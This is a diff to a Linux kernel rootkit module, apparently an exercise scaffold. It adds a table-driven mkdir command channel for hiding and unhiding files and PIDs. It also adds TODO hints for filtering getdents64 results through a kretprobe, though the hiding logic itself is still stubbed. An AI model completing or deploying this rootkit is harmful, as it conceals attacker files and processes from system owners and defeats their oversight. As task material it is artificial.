@@ -25,7 +25,10 @@ struct rk_target_list {
 static struct rk_target_list file_targets;
 static struct rk_target_list pid_targets;
 
-// Implement add, remove, and match for the target list.
+// TODO: rk_target_add (strscpy into targets[count], return -ENOSPC if full)
+// TODO: rk_target_remove (validate idx, memmove to close gap)
+// TODO: rk_target_match (strcmp loop, return true on hit)
+// TODO: should_hide_dirent (check file_targets and pid_targets)
 
 static int rk_target_add(struct rk_target_list *list, const char *name)
 {
@@ -37,7 +40,7 @@ static int rk_target_remove(struct rk_target_list *list, int idx)
 	return -ENOSYS;
 }
 
-// Implement rk_target_match and should_hide_dirent.
+// TODO: rk_target_match and should_hide_dirent (below)
 
 /* ---- getdents64 interception ---- */
 
@@ -47,13 +50,13 @@ struct getdents_data {
 
 static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	// Save the user-space dirent buffer pointer.
+	// TODO: save ubuf from inner pt_regs (syscall wrapper: double indirection)
 	return 0;
 }
 
 static int getdents_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	// Filter matching dirent records from the buffer.
+	// TODO: copy buffer, walk by d_reclen, memmove out hidden entries, write back
 	return 0;
 }
 
@@ -67,26 +70,50 @@ static struct kretprobe getdents_probe = {
 
 /* ---- mkdir command dispatcher (provided) ---- */
 
+typedef int (*rk_handler_t)(const char *arg);
+
+struct rk_cmd_entry {
+	const char *key;
+	rk_handler_t handler;
+};
+
+static int cmd_hide_file(const char *arg)   { return rk_target_add(&file_targets, arg); }
+static int cmd_unhide_file(const char *arg) { int i; return kstrtoint(arg, 10, &i) == 0 ? rk_target_remove(&file_targets, i) : -EINVAL; }
+static int cmd_hide_pid(const char *arg)    { return rk_target_add(&pid_targets, arg); }
+static int cmd_unhide_pid(const char *arg)  { int i; return kstrtoint(arg, 10, &i) == 0 ? rk_target_remove(&pid_targets, i) : -EINVAL; }
+
+static const struct rk_cmd_entry cmd_table[] = {
+	{ "h.f", cmd_hide_file },
+	{ "u.f", cmd_unhide_file },
+	{ "h.i", cmd_hide_pid },
+	{ "u.i", cmd_unhide_pid },
+};
+
 static int rk_dispatch(const char *name)
 {
-	int idx;
+	const struct rk_cmd_entry *best = NULL;
+	int best_len = 0;
+	const char *arg;
+	int i;
 
-	if (strncmp(name, "h.f.", 4) == 0)
-		return rk_target_add(&file_targets, name + 4);
-	if (strncmp(name, "u.f.", 4) == 0) {
-		if (kstrtoint(name + 4, 10, &idx) == 0)
-			return rk_target_remove(&file_targets, idx);
-		return -EINVAL;
-	}
-	if (strncmp(name, "h.i.", 4) == 0)
-		return rk_target_add(&pid_targets, name + 4);
-	if (strncmp(name, "u.i.", 4) == 0) {
-		if (kstrtoint(name + 4, 10, &idx) == 0)
-			return rk_target_remove(&pid_targets, idx);
-		return -EINVAL;
+	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
+		int klen = strlen(cmd_table[i].key);
+
+		if (strncmp(name, cmd_table[i].key, klen) != 0)
+			continue;
+		if (name[klen] != '\0' && name[klen] != '.')
+			continue;
+		if (klen > best_len) {
+			best = &cmd_table[i];
+			best_len = klen;
+		}
 	}
 
-	return -ENOENT;
+	if (!best)
+		return -ENOENT;
+
+	arg = name[best_len] == '.' ? name + best_len + 1 : NULL;
+	return best->handler(arg);
 }
 
 struct rk_mkdir_data {
@@ -180,14 +207,14 @@ static int __init rk_init(void)
 	spin_lock_init(&file_targets.lock);
 	spin_lock_init(&pid_targets.lock);
 
-	// Register getdents and mkdir probes with goto rollback.
+	// TODO: register getdents + mkdir probes with goto rollback, pr_info loaded
 
 	return 0;
 }
 
 static void __exit rk_exit(void)
 {
-	// Unregister probes in reverse order.
+	// TODO: unregister probes in reverse, pr_info unloaded
 }
 
 module_init(rk_init);
